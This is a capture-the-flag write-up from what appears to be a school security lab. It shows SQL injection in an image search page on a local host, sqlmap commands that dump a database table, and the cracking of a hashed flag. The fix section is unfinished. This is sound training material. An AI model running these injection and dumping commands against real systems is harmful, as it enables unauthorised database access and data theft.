# 01_Unsecure_img_search

The GET parameter in the image search form is vulnerable.  


## Method

Go to http://192.168.1.59/?page=searchimg.  
In the search field, search `1 AND 1=1`

## Manipulation

Open terminal (Powershell), run  
```bash
python sqlmap.py --url="http://192.168.1.59/?page=searchimg&id=1&Submit=Submit# --tables
```  

This displays all the databases & their tables.  
Thereafter tables can be dumped  
```bash
python sqlmap.py --url="http://192.168.1.59/?page=searchimg&id=1&Submit=Submit# --dump -T list_images
```  
where `list_images` refers to the table name  

```bash
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| id | url                              | title     | comment                                                                                                               |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| 1  | https://www.nsa.org/img.jpg      | Nsa       | An image about the NSA !                                                                                              |
| 2  | https://www.42.fr/42.png         | 42 !      | There is a number..                                                                                                   |
| 3  | https://www.google.fr/google.png | Google    | Google it !                                                                                                           |
| 4  | https://www.obama.org/obama.jpg  | Obama     | Yes we can !                                                                                                          |
| 5  | borntosec.ddns.net/images.png    | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |
| 6  | https://www.h4x0r3.0rg/tr0ll.png | tr00l     | Because why not ?                                                                                                     |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
```

Decode flag  
```bash
1928e8083cf461a51303633093573c46 -> albatroz -> F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188
```  


## Resolve

TBC

### Resources

https://www.hackers-arise.com/post/2017/04/24/database-hacking-part-4-extracting-data-with-sqlmap  
https://www.md5online.org/md5-decrypt.html  
https://passwordsgenerator.net/sha256-hash-generator/  
